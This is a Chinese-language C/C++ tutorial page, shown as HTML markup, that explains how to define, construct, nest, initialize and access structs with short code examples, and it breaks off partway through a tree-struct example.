&lt;h3 id=&#34;1-先定义结构体类型再单独进行变量定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-先定义结构体类型再单独进行变量定义&#34;&gt;#&lt;/a&gt; 1. 先定义结构体类型再单独进行变量定义&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct Student&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Name[20];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Sex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Student Stu;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Student StuArray[10];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Student *pStru;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结构体类型是 struct Student，因此，struct 和 Student 都不能省略。但实际上，我用 codeblocks 运行时，下面变量的定义，不加 struct 也是可以的。&lt;/p&gt;
&lt;h3 id=&#34;2-紧跟在结构体类型说明之后进行定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-紧跟在结构体类型说明之后进行定义&#34;&gt;#&lt;/a&gt; 2. 紧跟在结构体类型说明之后进行定义&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct Student&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Name[20];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Sex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;Stu,StuArray[10],*pStu;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这种情况时，后面还可以再定义结构体变量。&lt;/p&gt;
&lt;h3 id=&#34;3-在说明一个无名结构体变量的同时直接进行定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-在说明一个无名结构体变量的同时直接进行定义&#34;&gt;#&lt;/a&gt; 3. 在说明一个无名结构体变量的同时直接进行定义&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Name[20];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Sex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;Stu,Stu[10],*pStu;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这种情况下，之后不能再定义其他变量。&lt;/p&gt;
&lt;h3 id=&#34;4-使用typedef说明一个结构体变量之后再用新类名来定义变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-使用typedef说明一个结构体变量之后再用新类名来定义变量&#34;&gt;#&lt;/a&gt; 4. 使用 typedef 说明一个结构体变量之后再用新类名来定义变量&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;​&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Name[20];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Sex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;student;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Student Stu,Stu[10],*pStu;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Student 是一个具体的结构体类型，唯一标识。这里不用再加 struct&lt;/p&gt;
&lt;h3 id=&#34;5-使用new动态创建结构体变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-使用new动态创建结构体变量&#34;&gt;#&lt;/a&gt; 5. 使用 new 动态创建结构体变量&lt;/h3&gt;
&lt;p&gt;使用 new 动态创建结构体变量时，必须是结构体指针类型。访问时，普通结构体变量使用使用成员变量访问符 &amp;quot;.&amp;quot;，指针类型的结构体变量使用的成员变量访问符为 &amp;quot;-&amp;gt;&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：动态创建结构体变量使用后勿忘 delete。&lt;/strong&gt;&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Student&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Name[20];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char Sex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int Age;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;Stu,StuArray[10],*pStu;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Student *s = new Student();  // 或者Student *s = new Student;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s-&amp;gt;Code = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout&amp;lt;&amp;lt;s-&amp;gt;Code;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;二-结构体构造函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-结构体构造函数&#34;&gt;#&lt;/a&gt; 二、结构体构造函数&lt;/h2&gt;
&lt;h3 id=&#34;三种结构体初始化方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三种结构体初始化方法&#34;&gt;#&lt;/a&gt; 三种结构体初始化方法：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;1. 利用结构体自带的默认构造函数&lt;/li&gt;
&lt;li&gt;2. 利用带参数的构造函数&lt;/li&gt;
&lt;li&gt;3. 利用默认无参的构造函数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;要点&lt;/strong&gt;：什么都不写就是使用的结构体自带的默认构造函数，如果自己重写了带参数的构造函数，初始化结构体时如果不传入参数会出现错误。在建立结构体数组时，如果只写了带参数的构造函数将会出现数组无法初始化的错误！！！下面是一个比较安全的带构造的结构体示例&lt;br&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct node&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //注意构造函数最后这里没有分号哦！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  node() :x(), str(), data()&amp;#123;&amp;#125; //无参数的构造函数数组初始化时调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  node(int a, string b, char c) :data(a), str(b), x(c)&amp;#123;&amp;#125;//有参构造&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//结构体数组声明和定义&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct node&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //注意构造函数最后这里没有分号哦！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  node() :x(), str(), data()&amp;#123;&amp;#125; //无参数的构造函数数组初始化时调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  node(int a, string b, char c) :data(a), str(b), x(c)&amp;#123;&amp;#125;//初始化列表进行有参构造&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;N[10];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;三-结构体嵌套&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-结构体嵌套&#34;&gt;#&lt;/a&gt; 三、结构体嵌套&lt;/h2&gt;
&lt;p&gt;正如一个类的对象可以嵌套在另一个类中一样，一个结构体的实例也可以嵌套在另一个结构体中。例如，来看以下声明：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct Costs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    double wholesale;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    double retail;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Item&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string partNum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    string description;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Costs pricing;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;widget;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Costs 结构体有两个 double 类型成员，wholesale 和 retail。Item 结构体有 3 个成员，前 2 个是 partNum 和 description，它们都是 string 对象。第 3 个是 pricing，它是一个嵌套的 Costs 结构体。如果定义了一个名为 widget 的 Item 结构体，则图 3 说明了其成员。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://upload-images.jianshu.io/upload_images/4070621-dece9e95d9fdc33d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;嵌套结构体访问的方式：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;widget.partnum = &amp;quot;123A&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;widget.description = &amp;quot;iron widget&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;widget.pricing.wholesale = 100.0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;widget.pricing.retail = 150.0;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;四-结构体赋值与访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#四-结构体赋值与访问&#34;&gt;#&lt;/a&gt; 四、结构体赋值与访问&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;赋值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;初始化结构体变量成员的最简单的方法是使用初始化列表。初始化列表是用于初始化一组内存位置的值列表。列表中的项目用逗号分隔并用大括号括起来。&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct Date&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int day, month, year;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;该声明定义 birthday 是一个 Date 结构体的变量，大括号内的值按顺序分配给其成员。所以 birthday 的数据成员已初始化，如图 2 所示。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://upload-images.jianshu.io/upload_images/4070621-20ccb4470e86cf05.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/250/format/webp&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;也可以仅初始化结构体变量的部分成员。例如，如果仅知道要存储的生日是 8 月 23 日， 但不知道年份，则可以按以下方式定义和初始化变量：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Date birthday = &amp;#123;23,8&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里只有 day 和 month 成员被初始化，year 成员未初始化。但是，如果某个结构成员未被初始化，则所有跟在它后面的成员都需要保留为未初始化。使用初始化列表时，C++ 不提供跳过成员的方法。以下语句试图跳过 month 成员的初始化。这是不合法的。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Date birthday = &amp;#123;23,1983&amp;#125;; //非法&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还有一点很重要，不能在结构体声明中初始化结构体成员，因为结构体声明只是创建一个新的数据类型，还不存在这种类型的变量。例如，以下声明是非法的：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  //非法结构体声明&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct Date&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int day = 23,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    month = 8,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    year = 1983;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;；&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为结构体声明只声明一个结构体 “看起来是什么样子的”，所以不会在内存中创建成员变量。只有通过定义该结构体类型的变量来实例化结构体，才有地方存储初始值。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问&lt;br&gt;
定义结构体：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;struct MyTree&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MyTree*left;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    